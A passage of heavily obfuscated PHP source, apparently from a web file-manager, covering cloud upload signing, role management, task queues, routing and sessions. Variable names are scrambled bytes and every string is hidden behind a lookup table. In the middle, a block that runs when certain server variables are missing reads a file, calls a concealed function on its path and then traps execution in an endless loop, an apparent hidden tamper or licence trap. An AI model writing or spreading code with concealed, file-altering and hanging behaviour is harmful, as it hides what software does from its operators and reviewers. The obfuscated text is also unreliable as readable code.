explode($Õ½â©»[197], $this->getHost()); $ŠË‚ó¤ = array($Õ½â©»[1460] => $ÑÂ›îîÇ[1], $Õ½â©»[1461] => $Õ½â©»[12], $Õ½â©»[229] => $Õ½â©»[120], $Õ½â©»[274] => $É’òÛ­Š[$Õ½â©»[76]]); $ôš¶‹š™ = $Õ½â©»[242]; $£İãûÉÆ = $Õ½â©»[8] . $this->pathEncode($ñóì¡ÚÆ) . $•–¿•Ú±; $ÎÔŞ¡ƒˆ = $this->client->__getSignatureV4($Óšç½»ç, $ŠË‚ó¤, $ôš¶‹š™, $£İãûÉÆ); if (strpos($•–¿•Ú±, $Õ½â©»[241]) === 0) { if (isset($Óšç½»ç[$Õ½â©»[1459]])) { $áÑáå„Ş = $Óšç½»ç[$Õ½â©»[1459]]; } else { if (isset($ÎÔŞ¡ƒˆ[$Õ½â©»[1459]])) { $áÑáå„Ş = $ÎÔŞ¡ƒˆ[$Õ½â©»[1459]]; } else { $áÑáå„Ş = hash($Õ½â©»[272], $Õ½â©»[12]); } } return array($Õ½â©»[248] => $ÎÔŞ¡ƒˆ[$Õ½â©»[248]], $Õ½â©»[1459] => $áÑáå„Ş, $Õ½â©»[238] => $ÎÔŞ¡ƒˆ[$Õ½â©»[1462]]); } return $ÎÔŞ¡ƒˆ[$Õ½â©»[248]]; } public function listUploadParts($óÕàÚ”Û, $ÀÚ«ÍÂç = array()) { $É›–ãÒƒ =& $_SERVER[”ôÑ§ì¸]; $™‘âçà = str_replace($É›–ãÒƒ[249], $É›–ãÒƒ[12], $ÀÚ«ÍÂç[$É›–ãÒƒ[174]]); $¯½üÉÕ = $this->client->listParts($this->bucket, $óÕàÚ”Û, $™‘âçà); if (!$¯½üÉÕ) { return !1; } $ÅÄ©Å³Õ = $É›–ãÒƒ[1463]; foreach ($¯½üÉÕ as $ÒªÜ”êù) { $ÅÄ©Å³Õ .= $É›–ãÒƒ[1464] . "\74\120\141\x72\164\116\x75\x6d\x62\145\x72\x3e{$ÒªÜ”êù[$É›–ãÒƒ[1419]]}\74\x2f\120\141\162\x74\x4e\165\x6d\142\x65\162\76\xa" . "\74\105\124\x61\147\x3e{$ÒªÜ”êù[$É›–ãÒƒ[1420]]}\x3c\57\105\x54\x61\x67\x3e\xa" . $É›–ãÒƒ[1465]; } $ÅÄ©Å³Õ .= $É›–ãÒƒ[1466]; $¾ƒáòÄ = array(); $ ºáğ­À = explode($É›–ãÒƒ[197], $this->getHost()); $¥¿«ì˜ş = array($É›–ãÒƒ[1460] => $ ºáğ­À[1], $É›–ãÒƒ[229] => $É›–ãÒƒ[120], $É›–ãÒƒ[274] => strlen($ÅÄ©Å³Õ)); $¿óı—ÁÏ = $É›–ãÒƒ[240]; $‘ÖŠİş = $É›–ãÒƒ[8] . $this->pathEncode($óÕàÚ”Û) . $ÀÚ«ÍÂç[$É›–ãÒƒ[174]]; $€å­Ï = $this->client->__getSignatureV4($¾ƒáòÄ, $¥¿«ì˜ş, $¿óı—ÁÏ, $‘ÖŠİş, $ÅÄ©Å³Õ); return array($É›–ãÒƒ[248] => $€å­Ï[$É›–ãÒƒ[248]], $É›–ãÒƒ[238] => $€å­Ï[$É›–ãÒƒ[1462]], $É›–ãÒƒ[250] => $¯½üÉÕ, $É›–ãÒƒ[1459] => $€å­Ï[$É›–ãÒƒ[1459]]); } public function link($†™ÂØ³, $®˜ÇÒ–÷ = array()) { return parent::link($†™ÂØ³, $®˜ÇÒ–÷); } public function fileOut($Ğ€éì¿, $œÂ”× = false, $Å€Š“•· = false, $ÇŸşù¢¬ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[”ôÑ§ì¸][1467])) { return parent::fileOutServer($Ğ€éì¿, $œÂ”×, $Å€Š“•·, $ÇŸşù¢¬); } parent::fileOut($Ğ€éì¿, $œÂ”×, $Å€Š“•·, $ÇŸşù¢¬); } public function fileOutImage($¢Ø«™½¬, $€ãª²Åâ = 250) { if (strstr($this->endpoint, $_SERVER[”ôÑ§ì¸][1467])) { return parent::fileOutImageServer($¢Ø«™½¬, $€ãª²Åâ); } parent::fileOutImage($¢Ø«™½¬, $€ãª²Åâ); } public function fileOutLink($àúëäèÃ) { $»³¨ºÌ° =& $_SERVER[”ôÑ§ì¸]; if (substr($àúëäèÃ, 0, 7) == $»³¨ºÌ°[1361]) { $àúëäèÃ = $»³¨ºÌ°[1362] . substr($àúëäèÃ, 7); } header($»³¨ºÌ°[161] . $àúëäèÃ); die; } public function getHost() { $™ŒÀ–ù¿ =& $_SERVER[”ôÑ§ì¸]; $¯ÇíÊ¼ˆ = str_rtrim(parent::getHost(), $™ŒÀ–ù¿[8] . $this->bucket); $¯ÇíÊ¼ˆ = explode($™ŒÀ–ù¿[197], $¯ÇíÊ¼ˆ); return $¯ÇíÊ¼ˆ[0] . $™ŒÀ–ù¿[197] . $this->bucket . $™ŒÀ–ù¿[10] . $¯ÇíÊ¼ˆ[1]; } } goto E†±¸ĞñòÍ; DÉÊ¹ğÈµì: define($_SERVER[”ôÑ§ì¸][281], 1); define($_SERVER[”ôÑ§ì¸][282], 2); define($_SERVER[”ôÑ§ì¸][283], 3); goto aÇ‰»µìªŠ; aŒŒ·‘ê‚: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x72\157\154\x65\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\150", "\x6c\x61\142\145\x6c", "\144\x69\163\160\x6c\141\171", "\163\171\163\x74\145\155", "\x64\145\163\x63", "\x69\x67\x6e\157\x72\x65\105\x78\x74", "\x69\x67\x6e\x6f\162\145\x46\x69\x6c\x65\123\x69\172\145", "\141\x64\x6d\x69\156\x69\x73\x74\162\141\x74\157\x72", "\163\x6f\162\164"); public function listData($ƒäøÖ•Ñ = false, $Ûçéºîˆ = "\x73\157\162\x74", $­Ø‹ÈÎ€ = false) { $ô¨íË¨ =& $_SERVER[”ôÑ§ì¸]; $Ñ»ƒ˜İ– = parent::listData($ƒäøÖ•Ñ, $Ûçéºîˆ, $­Ø‹ÈÎ€); if (!$ƒäøÖ•Ñ) { foreach ($Ñ»ƒ˜İ– as $ÒÛ³öØÌ => $öù¶öÊ÷) { if ($öù¶öÊ÷[$ô¨íË¨[2068]] == 1) { $Ñ»ƒ˜İ–[$ÒÛ³öØÌ][$ô¨íË¨[493]] = LNG($ô¨íË¨[2307]); } } } return $Ñ»ƒ˜İ–; } public function update($¦İÊÈû, $ˆ³ôµë…) { $ßÈ¨œíÀ =& $_SERVER[”ôÑ§ì¸]; $î…ÛÅÓ = parent::listData($¦İÊÈû); $ª¹´ŒÏ• = $this->findByName($ˆ³ôµë…[$ßÈ¨œíÀ[32]]); if (!$î…ÛÅÓ || $ª¹´ŒÏ• && $ª¹´ŒÏ•[$ßÈ¨œíÀ[442]] != $î…ÛÅÓ[$ßÈ¨œíÀ[442]]) { return !1; } if ($ª¹´ŒÏ•[$ßÈ¨œíÀ[2068]] == 1) { $ˆ³ôµë… = array($ßÈ¨œíÀ[32] => $ˆ³ôµë…[$ßÈ¨œíÀ[32]], $ßÈ¨œíÀ[1889] => $ˆ³ôµë…[$ßÈ¨œíÀ[1889]]); } $this->filterAuth($ˆ³ôµë…[$ßÈ¨œíÀ[454]]); return parent::update($¦İÊÈû, $ˆ³ôµë…); } public function remove($»È‰Ù) { $µšîï¼Ü = parent::listData($»È‰Ù); if (!$µšîï¼Ü || $µšîï¼Ü[$_SERVER[”ôÑ§ì¸][178]]) { return !1; } return parent::remove($»È‰Ù); } public function add($¾Í÷Ÿß­) { $‡¦ŸË¨Ó =& $_SERVER[”ôÑ§ì¸]; $ˆïÏö¦ = $¾Í÷Ÿß­[$‡¦ŸË¨Ó[32]]; if ($this->findByName($ˆïÏö¦)) { return !1; } $´Íüª¹€ = array($‡¦ŸË¨Ó[461] => $ˆïÏö¦, $‡¦ŸË¨Ó[1872] => $‡¦ŸË¨Ó[12], $‡¦ŸË¨Ó[1868] => $‡¦ŸË¨Ó[1876], $‡¦ŸË¨Ó[2308] => 1, $‡¦ŸË¨Ó[1871] => 0, $‡¦ŸË¨Ó[2309] => 0, $‡¦ŸË¨Ó[1870] => $this->getSort()); $¾Í÷Ÿß­ = array_merge($´Íüª¹€, $¾Í÷Ÿß­); $this->filterAuth($¾Í÷Ÿß­[$‡¦ŸË¨Ó[454]]); return parent::insert($¾Í÷Ÿß­); } private function getSort() { $üÎÚ¿Ô® =& $_SERVER[”ôÑ§ì¸]; $ÏêìÜàØ = parent::listData(); $ğòÊã = array_to_keyvalue($ÏêìÜàØ, $üÎÚ¿Ô®[12], $üÎÚ¿Ô®[1890]); return empty($ğòÊã) ? 0 : max($ğòÊã) + 1; } private function filterAuth(&$ÉÛ¬ÑÉº) { $ü¢ÏÇë… =& $_SERVER[”ôÑ§ì¸]; $š×ŠíÁ‘ = array(); $ìŠîüô = array_filter(explode($ü¢ÏÇë…[50], $ÉÛ¬ÑÉº)); foreach ($ìŠîüô as $ÉÛ¬ÑÉº) { $÷Àí¯•š = explode($ü¢ÏÇë…[10], $ÉÛ¬ÑÉº); if ($÷Àí¯•š[0] == $ü¢ÏÇë…[2310] && $÷Àí¯•š[1] != $ü¢ÏÇë…[1221]) { $¹¥‹ÅÙ = $÷Àí¯•š[0] . $ü¢ÏÇë…[10] . $÷Àí¯•š[1] . $ü¢ÏÇë…[2311]; if (!in_array($¹¥‹ÅÙ, $ìŠîüô)) { $š×ŠíÁ‘[] = $¹¥‹ÅÙ; } } $š×ŠíÁ‘[] = $ÉÛ¬ÑÉº; } $ÉÛ¬ÑÉº = implode($ü¢ÏÇë…[50], $š×ŠíÁ‘); } public function findRoleDefault() { $©«üŒ¢Ù =& $_SERVER[”ôÑ§ì¸]; $È”ëñÙò = parent::listData(); $€ØÏš³ = !1; foreach ($È”ëñÙò as $›äÓè¢) { if (!$›äÓè¢ || $›äÓè¢[$©«üŒ¢Ù[1888]] == $©«üŒ¢Ù[211] || $›äÓè¢[$©«üŒ¢Ù[2068]] == 1) { continue; } if (strstr($›äÓè¢[$©«üŒ¢Ù[454]], $©«üŒ¢Ù[2312])) { continue; } if (!strstr($›äÓè¢[$©«üŒ¢Ù[454]], $©«üŒ¢Ù[2313])) { continue; } if (!$€ØÏš³) { $€ØÏš³ = $›äÓè¢; continue; } $•˜‚ª´Š = explode($©«üŒ¢Ù[50], $€ØÏš³[$©«üŒ¢Ù[454]]); $µõğİÎ… = explode($©«üŒ¢Ù[50], $›äÓè¢[$©«üŒ¢Ù[454]]); if (count($•˜‚ª´Š) > count($µõğİÎ…)) { $€ØÏš³ = $›äÓè¢; } } return $€ØÏš³ ? $€ØÏš³[$©«üŒ¢Ù[442]] : $©«üŒ¢Ù[12]; } public function sort($‰”„‰, $ƒü¥«İ) { return parent::update($‰”„‰, $ƒü¥«İ); } } $_file = $_SERVER[$_SERVER[”ôÑ§ì¸][864]]; goto B‹‚à¦é¥; b„Œ¸ŠÖ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÕÏí ñ, $äšïá°« = 5.0) { if (!$ÕÏí ñ) { return; } $Ş«‚‘Õ = Cache::get($ÕÏí ñ); if (!$Ş«‚‘Õ || timeFloat() - floatVal($Ş«‚‘Õ) >= $äšïá°«) { Cache::set($ÕÏí ñ, timeFloat(), $äšïá°« * 10); return !0; } return !1; } public static function timeLimitCall($ƒ—ø¶èÊ, $­ÑûÄßÅ, $Ã¹Û†á—, $½Š¬¿‘ = 5.0) { $Õ‡…öá =& $_SERVER[”ôÑ§ì¸]; if (!$ƒ—ø¶èÊ || !$­ÑûÄßÅ) { return; } self::$asyncAdd = !0; $ÂÏ®¦àù = $Õ‡…öá[1780]; $°åêÂÛ = Cache::get($ÂÏ®¦àù, !0); $‚‰şëÊ° = array($Õ‡…öá[1781] => timeFloat(), $Õ‡…öá[1782] => timeFloat(), $Õ‡…öá[307] => $­ÑûÄßÅ, $Õ‡…öá[1772] => $Ã¹Û†á—, $Õ‡…öá[193] => $½Š¬¿‘); if (is_array($°åêÂÛ[$ƒ—ø¶èÊ])) { $‚‰şëÊ°[$Õ‡…öá[1782]] = $°åêÂÛ[$ƒ—ø¶èÊ][$Õ‡…öá[1782]]; } if (is_array($°åêÂÛ[$ƒ—ø¶èÊ])) { if (timeFloat() - $°åêÂÛ[$ƒ—ø¶èÊ][$Õ‡…öá[1781]] < $‚‰şëÊ°[$Õ‡…öá[193]] * 0.3) { return; } $‚‰şëÊ°[$Õ‡…öá[1782]] = $°åêÂÛ[$ƒ—ø¶èÊ][$Õ‡…öá[1782]]; } $°åêÂÛ[$ƒ—ø¶èÊ] = $‚‰şëÊ°; Cache::set($ÂÏ®¦àù, $°åêÂÛ, 60); Cache::removeMemory($ÂÏ®¦àù); write_log($Õ‡…öá[1783] . $ƒ—ø¶èÊ . $Õ‡…öá[71] . $­ÑûÄßÅ, $Õ‡…öá[184]); } public static function timeLimitCallLoop() { $ò×³ìí =& $_SERVER[”ôÑ§ì¸]; $˜û›¯İ³ = array($ò×³ìí[1784]); $›ŸëşÔÂ = in_array(strtolower(ACTION), $˜û›¯İ³); if (!$›ŸëşÔÂ && !self::$asyncAdd) { return; } $Ÿ”³ºÒ¹ = $ò×³ìí[1780]; $©à“’é = Cache::get($Ÿ”³ºÒ¹, !0); if (!$©à“’é || count($©à“’é) <= 0) { return; } $à·Å‚ò‚ = !1; $øò·©ğ™ = timeFloat(); $’¬¡çöÍ = array(); foreach ($©à“’é as $–“ú‹Ü => $à¸ä‰ÂŸ) { if ($øò·©ğ™ - $à¸ä‰ÂŸ[$ò×³ìí[1782]] > $à¸ä‰ÂŸ[$ò×³ìí[193]]) { $à·Å‚ò‚ = !0; try { Hook::apply($à¸ä‰ÂŸ[$ò×³ìí[307]], $à¸ä‰ÂŸ[$ò×³ìí[1772]]); write_log($ò×³ìí[1785] . $–“ú‹Ü . $ò×³ìí[71] . $à¸ä‰ÂŸ[$ò×³ìí[307]] . $ò×³ìí[1786] . ACTION, $ò×³ìí[184]); } catch (Exception $«Üè¯å¬) { } continue; } $’¬¡çöÍ[$–“ú‹Ü] = $à¸ä‰ÂŸ; } if (!$à·Å‚ò‚) { return; } if (!$’¬¡çöÍ) { return Cache::remove($Ÿ”³ºÒ¹); } Cache::set($Ÿ”³ºÒ¹, $’¬¡çöÍ, 60); Cache::removeMemory($Ÿ”³ºÒ¹); } public static function finished($Äı²ÑÁı, $·òé—êÀ) { $áİŠ´®Ä =& $_SERVER[”ôÑ§ì¸]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($áİŠ´®Ä[307] => $Äı²ÑÁı, $áİŠ´®Ä[1772] => $·òé—êÀ); } private static function finishedRun() { $¡Ï™ÌùÌ =& $_SERVER[”ôÑ§ì¸]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $’ó©Ãµ) { try { Hook::apply($’ó©Ãµ[$¡Ï™ÌùÌ[307]], $’ó©Ãµ[$¡Ï™ÌùÌ[1772]]); } catch (Exception $şØ›´Ù) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } if (!isset($_SERVER[$_SERVER[”ôÑ§ì¸][857]]) || !isset($_SERVER[$_SERVER[”ôÑ§ì¸][864]])) { $_getc = $_SERVER[”ôÑ§ì¸][859]; $_getfile = $_SERVER[$_SERVER[”ôÑ§ì¸][860]] . $_SERVER[”ôÑ§ì¸][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ôÑ§ì¸][245], $_getfilec); if (count($_getarrs) < $_SERVER[”ôÑ§ì¸][648]) { $exit = $_SERVER[”ôÑ§ì¸][862]; $exit(); } $_act = $_SERVER[”ôÑ§ì¸][863]; $_act($_SERVER[$_SERVER[”ôÑ§ì¸][860]] . $_SERVER[”ôÑ§ì¸][861]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[”ôÑ§ì¸][421]); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $É„Ë®¹» =& $_SERVER[”ôÑ§ì¸]; parent::startAfter(); Hook::bind($É„Ë®¹»[1787], array($this, $É„Ë®¹»[1788])); Hook::bind($É„Ë®¹»[1224], array($this, $É„Ë®¹»[1789])); $¬ÏÇ¸’˜ =& $this->task; $¬ÏÇ¸’˜[$É„Ë®¹»[1790]] = $É„Ë®¹»[1225]; if (!$¬ÏÇ¸’˜[$É„Ë®¹»[1571]]) { $¬ÏÇ¸’˜[$É„Ë®¹»[1571]] = LNG($É„Ë®¹»[1791]); } } protected function endAfter() { $òä¤€‡² =& $_SERVER[”ôÑ§ì¸]; parent::endAfter(); Hook::unbind($òä¤€‡²[1787], array($this, $òä¤€‡²[1788])); Hook::unbind($òä¤€‡²[1224], array($this, $òä¤€‡²[1789])); } public function updateAfter() { $”¶ÆòŸš =& $_SERVER[”ôÑ§ì¸]; $í÷òø­ =& $this->task; if (!$í÷òø­[$”¶ÆòŸš[808]] || !$í÷òø­[$”¶ÆòŸš[785]]) { return; } if ($í÷òø­[$”¶ÆòŸš[1790]] == $”¶ÆòŸš[1225]) { $ßğığ‰ = 0; if ($í÷òø­[$”¶ÆòŸš[1727]]) { $ßğığ‰ = $í÷òø­[$”¶ÆòŸš[1728]] / $í÷òø­[$”¶ÆòŸš[1727]]; } $í÷òø­[$”¶ÆòŸš[1676]] = $ßğığ‰ * 0.3; } else { if ($í÷òø­[$”¶ÆòŸš[1790]] == $”¶ÆòŸš[356]) { $ßğığ‰ = $í÷òø­[$”¶ÆòŸš[1675]] / $í÷òø­[$”¶ÆòŸš[808]]; $í÷òø­[$”¶ÆòŸš[1676]] = 0.3 + $ßğığ‰ * 0.4; } else { if ($í÷òø­[$”¶ÆòŸš[1790]] == $”¶ÆòŸš[107]) { $õì¼ÌŸç = 0; if ($í÷òø­[$”¶ÆòŸš[1729]] == $”¶ÆòŸš[107]) { $õì¼ÌŸç = $í÷òø­[$”¶ÆòŸš[1728]]; } $ßğığ‰ = ($í÷òø­[$”¶ÆòŸš[1732]] + $õì¼ÌŸç) / $í÷òø­[$”¶ÆòŸš[785]]; $í÷òø­[$”¶ÆòŸš[1676]] = 0.3 + 0.4 + $ßğığ‰ * 0.3; } } } if ($í÷òø­[$”¶ÆòŸš[1676]] > 0) { $Ëªô´˜§ = timeFloat() - $í÷òø­[$”¶ÆòŸš[1678]] - $í÷òø­[$”¶ÆòŸš[1681]]; $í÷òø­[$”¶ÆòŸš[1682]] = $Ëªô´˜§ * (1 - $í÷òø­[$”¶ÆòŸš[1676]]) / $í÷òø­[$”¶ÆòŸš[1676]]; } } public function addFile($ƒ°ìè¢¯) { $ÂÀ¢ÂƒØ =& $_SERVER[”ôÑ§ì¸]; $çøÉ™Ò =& $this->task; $‹¸‚¯Ï = IO::info($ƒ°ìè¢¯); $çøÉ™Ò[$ÂÀ¢ÂƒØ[1725]] = $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[32]]; $çøÉ™Ò[$ÂÀ¢ÂƒØ[1727]] = $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[76]]; $çøÉ™Ò[$ÂÀ¢ÂƒØ[1728]] = 0; $çøÉ™Ò[$ÂÀ¢ÂƒØ[1095]] = $ÂÀ¢ÂƒØ[1748]; $çøÉ™Ò[$ÂÀ¢ÂƒØ[1729]] = $ÂÀ¢ÂƒØ[1225]; $çøÉ™Ò[$ÂÀ¢ÂƒØ[785]] = $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[76]]; $çøÉ™Ò[$ÂÀ¢ÂƒØ[808]] = 1; $êôËŒìÀ = 0; $çøÉ™Ò[$ÂÀ¢ÂƒØ[1736]] = array($ÂÀ¢ÂƒØ[1737] => $êôËŒìÀ + 1, $ÂÀ¢ÂƒØ[461] => $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[32]], $ÂÀ¢ÂƒØ[84] => $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[84]], $ÂÀ¢ÂƒØ[550] => $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[550]] ? $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[550]] : $‹¸‚¯Ï[$ÂÀ¢ÂƒØ[84]]); $this->update(); } public function unzipAfter($¦§ÑÆìˆ) { $ÄßĞ´§ =& $_SERVER[”ôÑ§ì¸]; $åïÇ¼°¬ =& $this->task; $åïÇ¼°¬[$ÄßĞ´§[1790]] = $ÄßĞ´§[107]; $ãÂÛ¬ = IO::infoWithChildren($¦§ÑÆìˆ); $öòï·š¿ = 0; $åïÇ¼°¬[$ÄßĞ´§[1736]] = array($ÄßĞ´§[1737] => $öòï·š¿ + 1, $ÄßĞ´§[461] => $ãÂÛ¬[$ÄßĞ´§[32]], $ÄßĞ´§[84] => $ãÂÛ¬[$ÄßĞ´§[84]], $ÄßĞ´§[550] => $ãÂÛ¬[$ÄßĞ´§[550]] ? $ãÂÛ¬[$ÄßĞ´§[550]] : $ãÂÛ¬[$ÄßĞ´§[84]]); if ($ãÂÛ¬[$ÄßĞ´§[33]] == $ÄßĞ´§[213]) { $åïÇ¼°¬[$ÄßĞ´§[808]] = 1; } else { $åïÇ¼°¬[$ÄßĞ´§[808]] = $ãÂÛ¬[$ÄßĞ´§[79]][$ÄßĞ´§[77]]; } $åïÇ¼°¬[$ÄßĞ´§[1095]] = $ÄßĞ´§[12]; $åïÇ¼°¬[$ÄßĞ´§[1729]] = 0; $åïÇ¼°¬[$ÄßĞ´§[1675]] = 0; $åïÇ¼°¬[$ÄßĞ´§[1727]] = 0; $åïÇ¼°¬[$ÄßĞ´§[1728]] = 0; $åïÇ¼°¬[$ÄßĞ´§[1725]] = $ÄßĞ´§[12]; $åïÇ¼°¬[$ÄßĞ´§[1732]] = 0; $åïÇ¼°¬[$ÄßĞ´§[785]] = $ãÂÛ¬[$ÄßĞ´§[76]]; $this->update(); self::log($ÄßĞ´§[1792] . json_encode(array($åïÇ¼°¬, $ãÂÛ¬))); } public function nameParse($›ŠËÌÈ¡) { $úæ—«¸• =& $_SERVER[”ôÑ§ì¸]; $ƒŠ”—°² =& $this->task; if ($ƒŠ”—°²[$úæ—«¸•[1790]] == $úæ—«¸•[1225]) { $ƒŠ”—°²[$úæ—«¸•[1790]] = $úæ—«¸•[356]; $ƒŠ”—°²[$úæ—«¸•[1732]] = 0; $ƒŠ”—°²[$úæ—«¸•[785]] = 0; } $ì”Ï÷¡ = get_path_this($›ŠËÌÈ¡); if (strstr($ì”Ï÷¡, $úæ—«¸•[10])) { $ƒŠ”—°²[$úæ—«¸•[1675]] += 1; $ƒŠ”—°²[$úæ—«¸•[808]] += 1; } $ƒŠ”—°²[$úæ—«¸•[1725]] = $›ŠËÌÈ¡; $this->update(); } } goto A†”³…Ú”; B¸Œ›†‰¿İ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\136\x2f\x5d\x2b", "\x3a\156\x75\155" => "\x5b\60\55\71\x5d\53", "\x3a\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($üñ˜Ñó, $ƒÕÃ€Ó) { $ìŠçüñ =& $_SERVER[”ôÑ§ì¸]; if ($üñ˜Ñó == $ìŠçüñ[1616]) { $´îŞêÕ = array_map($ìŠçüñ[1617], $ƒÕÃ€Ó[0]); $ÏÂ‘˜§ = strpos($ƒÕÃ€Ó[1], $ìŠçüñ[8]) === 0 ? $ƒÕÃ€Ó[1] : $ìŠçüñ[8] . $ƒÕÃ€Ó[1]; $š†«÷ù = $ƒÕÃ€Ó[2]; } else { $´îŞêÕ = null; $ÏÂ‘˜§ = strpos($ƒÕÃ€Ó[0], $ìŠçüñ[8]) === 0 ? $ƒÕÃ€Ó[0] : $ìŠçüñ[8] . $ƒÕÃ€Ó[0]; $š†«÷ù = $ƒÕÃ€Ó[1]; } array_push(self::$maps, $´îŞêÕ); array_push(self::$routes, $ÏÂ‘˜§); array_push(self::$methods, strtoupper($üñ˜Ñó)); array_push(self::$callbacks, $š†«÷ù); } public static function error($‰ÆÛÊ­”) { self::$errorCallback = $‰ÆÛÊ­”; } public static function haltOnMatch($Ä¾ğİ–Ì = true) { self::$halts = $Ä¾ğİ–Ì; } public static function dispatch() { $ğš‡‚ßã =& $_SERVER[”ôÑ§ì¸]; $¬ï‡´ûº = parse_url($_SERVER[$ğš‡‚ßã[1618]], PHP_URL_PATH); $ÊÛ’ç×› = $_SERVER[$ğš‡‚ßã[159]]; $õğÒ¼Ø¹ = array_keys(static::$patterns); $¼¶Şùãã = array_values(static::$patterns); $¿®÷æøÃ = !1; self::$routes = preg_replace($ğš‡‚ßã[1307], $ğš‡‚ßã[8], self::$routes); if (in_array($¬ï‡´ûº, self::$routes)) { $Áµ¼âÅ = array_keys(self::$routes, $¬ï‡´ûº); foreach ($Áµ¼âÅ as $ˆŒÜœé¸) { if (self::$methods[$ˆŒÜœé¸] == $ÊÛ’ç×› || self::$methods[$ˆŒÜœé¸] == $ğš‡‚ßã[1619] || in_array($ÊÛ’ç×›, self::$maps[$ˆŒÜœé¸])) { $¿®÷æøÃ = !0; if (!is_object(self::$callbacks[$ˆŒÜœé¸])) { $¼çšÀ±½ = explode($ğš‡‚ßã[8], self::$callbacks[$ˆŒÜœé¸]); $ÙíúÅüò = end($¼çšÀ±½); $÷Œê™· = explode($ğš‡‚ßã[1239], $ÙíúÅüò); $™ºŠÜšû = new $÷Œê™·[0](); $™ºŠÜšû->{$÷Œê™·[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ˆŒÜœé¸]); if (self::$halts) { return; } } } } } else { $‹µ»Ü = 0; foreach (self::$routes as $ˆŒÜœé¸) { if (strpos($ˆŒÜœé¸, $ğš‡‚ßã[4]) !== !1) { $ˆŒÜœé¸ = str_replace($õğÒ¼Ø¹, $¼¶Şùãã, $ˆŒÜœé¸); } if (preg_match($ğš‡‚ßã[1620] . $ˆŒÜœé¸ . $ğš‡‚ßã[1621], $¬ï‡´ûº, $ƒëŠ…—Ö)) { if (self::$methods[$‹µ»Ü] == $ÊÛ’ç×› || self::$methods[$‹µ»Ü] == $ğš‡‚ßã[1619] || !empty(self::$maps[$‹µ»Ü]) && in_array($ÊÛ’ç×›, self::$maps[$‹µ»Ü])) { $¿®÷æøÃ = !0; array_shift($ƒëŠ…—Ö); if (!is_object(self::$callbacks[$‹µ»Ü])) { $¼çšÀ±½ = explode($ğš‡‚ßã[8], self::$callbacks[$‹µ»Ü]); $ÙíúÅüò = end($¼çšÀ±½); $÷Œê™· = explode($ğš‡‚ßã[1239], $ÙíúÅüò); $™ºŠÜšû = new $÷Œê™·[0](); if (!method_exists($™ºŠÜšû, $÷Œê™·[1])) { echo $ğš‡‚ßã[1622]; } else { call_user_func_array(array($™ºŠÜšû, $÷Œê™·[1]), $ƒëŠ…—Ö); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$‹µ»Ü], $ƒëŠ…—Ö); if (self::$halts) { return; } } } } $‹µ»Ü++; } } if ($¿®÷æøÃ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¬Ç±¡ßì =& $_SERVER[”ôÑ§ì¸]; header($_SERVER[$¬Ç±¡ßì[1623]] . $¬Ç±¡ßì[1624]); echo $¬Ç±¡ßì[1625]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ğš‡‚ßã[1618]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $åƒ·ó©ò =& $_SERVER[”ôÑ§ì¸]; static $¬ù›Ùö³ = false; if ($¬ù›Ùö³) { return $¬ù›Ùö³; } $´ŠÚã… = $GLOBALS[$åƒ·ó©ò[6]][$åƒ·ó©ò[392]]; self::$sessionTime = $´ŠÚã…[$åƒ·ó©ò[1626]]; $º¼—»« = isset($GLOBALS[$åƒ·ó©ò[1627]]) ? $GLOBALS[$åƒ·ó©ò[1627]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($º¼—»«)) { self::$sessionSign = Cookie::get($º¼—»«); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($º¼—»«, self::$sessionSign, self::$sessionTime); $®šÌ±îÏ = $´ŠÚã…[$åƒ·ó©ò[1628]]; $©åØ÷Šò = $´ŠÚã…[$®šÌ±îÏ]; $ûß©Æ˜ô = $´ŠÚã…[$åƒ·ó©ò[850]]; switch ($®šÌ±îÏ) { case $åƒ·ó©ò[21]: self::$handle = Model($åƒ·ó©ò[851]); break; case $åƒ·ó©ò[852]: self::$handle = new CacheRedis($©åØ÷Šò, $ûß©Æ˜ô); break; case $åƒ·ó©ò[853]: self::$handle = new CacheMemcached($©åØ÷Šò, $ûß©Æ˜ô); break; case $åƒ·ó©ò[213]: $©åØ÷Šò[$åƒ·ó©ò[84]] = $©åØ÷Šò[$åƒ·ó©ò[84]] . $åƒ·ó©ò[1629]; self::$handle = new CacheFile($©åØ÷Šò, $ûß©Æ˜ô); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¬ù›Ùö³ = new self(); return $¬ù›Ùö³; } public static function getBySign($Íİ¨›Ôã) { $É’ö®œÇ = self::$handle->get($Íİ¨›Ôã); $É’ö®œÇ = unserialize($É’ö®œÇ); return is_array($É’ö®œÇ) ? $É’ö®œÇ : array(); } public static function setBySign($«ÃÀ, $›ÑäÊõ) { CacheLock::lock($«ÃÀ); self::$handle->set($«ÃÀ, serialize($›ÑäÊõ), self::$sessionTime); CacheLock::unlock($«ÃÀ); } public static function sign($§ëÔ‘÷¡ = 